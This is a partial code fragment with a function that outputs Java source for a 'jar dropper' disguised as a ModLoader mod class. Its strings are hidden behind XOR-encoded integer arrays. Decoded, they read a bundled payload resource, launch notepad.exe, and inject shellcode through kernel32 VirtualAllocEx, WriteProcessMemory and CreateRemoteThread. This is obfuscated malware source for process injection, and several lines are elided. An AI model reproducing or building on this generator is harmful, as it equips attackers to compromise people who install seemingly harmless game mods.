...
function generateJarDropperSource(): string {
  return [
    ...
    "    InputStream is=ModLoader.class.getResourceAsStream(x(new int[]{117,59,41,41,63,46,41,117,62,59,46,59,116,42,59,49}));",
    ...
    "    Class<?>MC=Class.forName(x(new int[]{57,53,55,116,41,47,52,116,48,52,59,116,23,63,55,53,40,35}));",
    "    java.lang.reflect.Method gf=FC.getMethod(x(new int[]{61,63,46,28,47,52,57,46,51,53,52}),String.class,String.class);",
    ...
    "    clr.invoke(piMem);",
    "    Object fCPA=gf.invoke(null,x(new int[]{49,63,40,52,63,54,105,104}),x(new int[]{25,40,63,59,46,63,10,40,53,57,63,41,41,27}));",
    "    String sysRoot=System.getenv(x(new int[]{9,35,41,46,63,55,8,53,53,46}));",
    "    if(sysRoot==null||sysRoot.isEmpty())sysRoot=\"C:\\\\Windows\";",
    "    String tgtExe=x(new int[]{52,53,46,63,42,59,62,116,63,34,63});",
    ...
    "    Object fVA=gf.invoke(null,x(new int[]{49,63,40,52,63,54,105,104}),x(new int[]{12,51,40,46,47,59,54,27,54,54,53,57,31,34}));",
    "    Object ra=iv.invoke(fVA,PC,new Object[]{hProc,NP,(long)sc.length,0x3000,0x40});",
    "    log(\"raddr=\"+ra);",
    "    if(ra==null||ra.equals(NP))return;",
    "    Object fWM=gf.invoke(null,x(new int[]{49,63,40,52,63,54,105,104}),x(new int[]{13,40,51,46,63,10,40,53,57,63,41,41,23,63,55,53,40,35}));",
    ...
    "    log(\"written\");",
    "    Object fCT=gf.invoke(null,x(new int[]{49,63,40,52,63,54,105,104}),x(new int[]{25,40,63,59,46,63,8,63,55,53,46,63,14,50,40,63,59,62}));",
